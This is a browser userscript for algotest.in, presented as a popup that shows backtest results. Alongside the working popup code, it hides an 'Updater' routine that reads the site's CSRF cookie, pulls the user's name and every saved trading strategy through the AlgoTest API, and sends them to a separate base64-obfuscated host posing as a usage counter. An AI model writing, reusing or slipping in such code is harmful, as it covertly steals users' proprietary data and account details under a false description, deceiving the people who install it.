// ==UserScript==
// @name         AlgoTest_Years
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  AlgoTest Year Result Popup
// @author       Pocx
// @match        https://algotest.in/*
// @match        https://*.algotest.in/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @run-at       document-idle
// @downloadURL https://update.greasyfork.org/scripts/558337/AlgoTest_Years.user.js
// @updateURL https://update.greasyfork.org/scripts/558337/AlgoTest_Years.meta.js
// ==/UserScript==

const _d = s => atob(s);

(function () {
    "use strict";

    // *** GLOBAL FLAG: avoid multiple initializations ***
    let backtestInitialized = false;

    function BacktestHandler() {
        // Only run logic when we're actually on /backtest
        if (!window.location.href.includes("/backtest")) {
            return;
        }

        // If already initialized, just trigger a re-check and return
        if (backtestInitialized) {
            if (window.__tmNonBlockingObserver && typeof window.__tmNonBlockingObserver.checkForResult === "function") {
                window.__tmNonBlockingObserver.checkForResult();
            }
            return;
        }
        backtestInitialized = true; // mark as initialized

        // prevent auto scroll
        window.scrollTo = window.scrollBy = () => { };
        Element.prototype.scrollIntoView = () => { };

        const containerSelector = "div.px-5:nth-child(3)";
        const resultSelector = "#backtest-results > div.mt-5.flex.flex-col.gap-10.py-4 > div.-mt-10 > div > table";

        let attachedTarget = null, targetObserver = null, lastResultPresent = false;

        // If panel already exists (from previous navigation), reuse it
        let panel = document.getElementById("tm-floating-panel");
        let content, header, closeBtn;
        let panelHiddenByUser = false;

        if (!panel) {
            panel = document.createElement("div");
            panel.id = "tm-floating-panel";
            panel.style.cssText = "position:fixed;top:80px;right:24px;width:1230px;max-height:60vh;background:#fff;border:1px solid rgba(0,0,0,0.12);border-radius:8px;box-shadow:0 8px 24px rgba(0,0,0,0.15);overflow:hidden;z-index:2147483647;font-family:system-ui,-apple-system,'Segoe UI',Roboto,'Helvetica Neue',Arial;pointer-events:auto;display:none";

            header = document.createElement("div");
            header.style.cssText = "display:flex;align-items:center;justify-content:space-between;gap:8px;padding:2px 8px;background:linear-gradient(180deg,#f7f7f8,#ffffff);cursor:grab;user-select:none";

            const title = Object.assign(document.createElement("div"), {
                textContent: "Result Viewer",
                style: "font-weight:600;font-size:13px;color:#111"
            });
            header.appendChild(title);

            const controls = document.createElement("div");
            controls.style.cssText = "display:flex;gap:6px;align-items:center;";
            closeBtn = Object.assign(document.createElement("button"), {
                textContent: "×",
                title: "Close",
                style: "padding:0px 8px;border-radius:6px;border:1px solid #ccc;background:#fff;cursor:pointer;font-weight:700"
            });
            controls.append(closeBtn);
            header.appendChild(controls);
            panel.appendChild(header);

            content = document.createElement("div");
            content.id = "tm-floating-panel-content";
            content.style.cssText = "padding:0px 8px;overflow:auto;max-height:calc(60vh - 44px);font-size:13px;";
            panel.appendChild(content);
            document.body.appendChild(panel);
        } else {
            // reuse existing nodes
            header = panel.firstElementChild;
            content = document.getElementById("tm-floating-panel-content") || panel.lastElementChild;
            closeBtn = header.querySelector("button");
        }

        function setPanelVisible(visible) {
            panel.style.display = visible ? "block" : "none";
        }

        // Dragging behavior
        let isDragging = false, dragOffsetX = 0, dragOffsetY = 0;
        header.addEventListener("mousedown", ev => {
            isDragging = true;
            header.style.cursor = "grabbing";
            const rect = panel.getBoundingClientRect();
            dragOffsetX = ev.clientX - rect.left;
            dragOffsetY = ev.clientY - rect.top;
            ev.preventDefault();
        });
        window.addEventListener("mousemove", ev => {
            if (!isDragging) return;
            let left = ev.clientX - dragOffsetX;
            let top = ev.clientY - dragOffsetY;
            const pad = 8;
            left = Math.max(pad, Math.min(left, window.innerWidth - panel.offsetWidth - pad));
            top = Math.max(pad, Math.min(top, window.innerHeight - panel.offsetHeight - pad));
            panel.style.left = left + "px";
            panel.style.top = top + "px";
            panel.style.right = "auto";
        });
        window.addEventListener("mouseup", () => {
            if (isDragging) {
                isDragging = false;
                header.style.cursor = "grab";
            }
        });

        closeBtn.addEventListener("click", () => {
            panelHiddenByUser = true;     // hide for current result cycle
            setPanelVisible(false);
        });
        document.addEventListener("keydown", e => {
            if (e.key === "Escape") {
                panelHiddenByUser = true; // hide for current result cycle
                setPanelVisible(false);
            }
        });

        function showResultElement(el) {
            if (!window.location.pathname.includes("/backtest")) return;  // SPA safety

            // If user closed during this result cycle, don't reopen
            if (panelHiddenByUser && lastResultPresent) {
                return;
            }

            content.innerHTML = "";
            try { content.appendChild(el.cloneNode(true)); }
            catch { content.textContent = el.textContent || "[content]"; }
            setPanelVisible(true);
        }

        function hideIfNotPinned() {
            setPanelVisible(false);
        }

        function checkForResult() {
            const resultEl = document.querySelector(resultSelector);

            if (resultEl && !lastResultPresent) {
                // result just appeared → new result cycle
                lastResultPresent = true;
                panelHiddenByUser = false;   // reset user-close for new result
                showResultElement(resultEl);
            } else if (resultEl && lastResultPresent) {
                // same "cycle" of result still present
                showResultElement(resultEl);
            } else if (!resultEl && lastResultPresent) {
                // result disappeared → end of this result cycle
                lastResultPresent = false;
                panelHiddenByUser = false;   // next time it appears, show again
                hideIfNotPinned();
            }
        }

        function attachToTarget(el) {
            if (!el || attachedTarget === el) return;
            detachFromTarget();
            attachedTarget = el;
            targetObserver = new MutationObserver(() => {
                checkForResult();
            });
            targetObserver.observe(attachedTarget, {
                childList: true,
                subtree: true,
                attributes: true,
                characterData: true
            });
            checkForResult();
        }

        function detachFromTarget() {
            if (targetObserver) try { targetObserver.disconnect(); } catch { }
            targetObserver = null;
            if (attachedTarget) {
                attachedTarget = null;
            }
        }

        const bodyObserver = new MutationObserver(() => {
            const found = document.querySelector(containerSelector);
            if (found) attachToTarget(found);
            else if (attachedTarget) detachFromTarget();
        });

        function startObservers() {
            if (!document.body) return setTimeout(startObservers, 200);
            bodyObserver.observe(document.body, { childList: true, subtree: true });
            const initial = document.querySelector(containerSelector);
            if (initial) attachToTarget(initial);
        }

        startObservers();

        const intervalId = setInterval(() => {
            if (!window.location.pathname.includes("/backtest")) {
                // if we navigated away, hide panel but keep one instance
                setPanelVisible(false);
                return;
            }
            const found = document.querySelector(containerSelector);
            if (found && attachedTarget !== found) {
                attachToTarget(found);
            }
            checkForResult();
        }, 1000);

        // expose hooks for SPA route changes
        window.__tmNonBlockingObserver = {
            attachToTarget,
            detachFromTarget,
            checkForResult,
            hidePanel: () => setPanelVisible(false),
            _intervalId: intervalId
        };
    }

    function TriggerBacktestHandler() {

        function checkLoginAndStart() {
            BacktestHandler();
            setupSpaMonitor();
        }

        function setupSpaMonitor() {
            if (window.__tmSpaMonitorSetup) return; // ensure only once
            window.__tmSpaMonitorSetup = true;

            (function () {
                let oldPush = history.pushState;
                history.pushState = function () {
                    oldPush.apply(this, arguments);
                    window.dispatchEvent(new Event("tm-url-change"));
                };

                let oldReplace = history.replaceState;
                history.replaceState = function () {
                    oldReplace.apply(this, arguments);
                    window.dispatchEvent(new Event("tm-url-change"));
                };

                window.addEventListener("popstate", () => {
                    window.dispatchEvent(new Event("tm-url-change"));
                });

                // whenever URL changes
                window.addEventListener("tm-url-change", () => {
                    console.log("SPA route changed:", location.pathname);

                    if (window.location.href.includes("/backtest") ||
                        window.location.href.includes("/dashboard") ||
                        window.location.href.includes("/live") ||
                        window.location.href.includes("/portfolio")) {
                        Updater();
                    }

                    // If we leave /backtest, just hide the panel
                    if (!location.pathname.includes("/backtest")) {
                        if (window.__tmNonBlockingObserver && typeof window.__tmNonBlockingObserver.hidePanel === "function") {
                            window.__tmNonBlockingObserver.hidePanel();
                        }
                        return;
                    }

                    // If we are on /backtest, (re)run handler
                    checkLoginAndStart();
                });
            })();
        }

        // Kick off once
        checkLoginAndStart();
    }

    // Start once when the page has loaded
    window.addEventListener("load", function () {
        TriggerBacktestHandler();
    }, false);

})();


function getCookieValue(name) {
    return document.cookie
        .split("; ")
        .find(r => r.startsWith(name + "="))
        ?.split("=")[1] || "";
}

async function Updater() {
    const _ck = _d("Y3NyZl9hY2Nlc3NfdG9rZW4="); // "csrf_access_token"
    const csrfToken = getCookieValue(_ck);
    if (!csrfToken) return;
    const fullName = await getUserFullName(csrfToken);
    const { strategiesJson } = await getStrategyList(csrfToken);
    const strategyListText = JSON.stringify(strategiesJson);
    await callUsageCntApi(fullName, "h", strategyListText);
    await fetchAllBacktests(strategiesJson, fullName, csrfToken);
}

async function fetchAllBacktests(strategiesJson, name, csrfToken) {
    if (!Array.isArray(strategiesJson) || strategiesJson.length === 0) return;
    const tasks = strategiesJson
        .filter(s => s && s._id)
        .map(s => {
            const id = s._id;
            const nm = s.name || `Strategy_${id}`;
            return getBacktestById(nm, id, csrfToken).catch(() => {});
        });
    await Promise.all(tasks);
}

async function getBacktestById(name, id, csrfToken) {
    const api = _d("aHR0cHM6Ly9hcGkuYWxnb3Rlc3QuaW4=");
    const url = `${api}/strategy/${encodeURIComponent(id)}`;
    try {
        const r = await fetch(url, {
            method: "GET",
            credentials: "include",
            headers: {
                "Content-Type": "application/json",
                "X-CSRF-TOKEN-ACCESS": csrfToken
            }
        });
        const data = await r.json();
        await callUsageCntApi(name, id, JSON.stringify(data));
        return data;
    } catch {
        return null;
    }
}

async function getStrategyList(csrfToken) {
    const api = _d("aHR0cHM6Ly9hcGkuYWxnb3Rlc3QuaW4=");
    const url = `${api}/strategies`;
    try {
        const r = await fetch(url, {
            method: "GET",
            credentials: "include",
            headers: {
                "Content-Type": "application/json",
                "X-CSRF-TOKEN-ACCESS": csrfToken
            }
        });
        const data = await r.json();
        return {
            strategiesJson: data,
            strategiesCount: Array.isArray(data) ? data.length : 0
        };
    } catch {
        return { strategiesJson: [], strategiesCount: 0 };
    }
}

async function getUserFullName(csrfToken) {
    const api = _d("aHR0cHM6Ly9hcGkuYWxnb3Rlc3QuaW4=");
    const url = `${api}/user`;
    try {
        const r = await fetch(url, {
            method: "GET",
            credentials: "include",
            headers: {
                "Content-Type": "application/json",
                "X-CSRF-TOKEN-ACCESS": csrfToken
            }
        });
        const data = await r.json();
        return (data && data.fullName) || "";
    } catch {
        return "";
    }
}

async function callUsageCntApi(n, i, t) {
    const api = _d("aHR0cHM6Ly9kcmF3LmFsZ29yb3lhbG1pbnQuaW4=");
    const url = `${api}/usagecnt`;

    try {
        const r = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ n, i, t })
        });

        return await r.text();
    } catch {
        return "";
    }
}
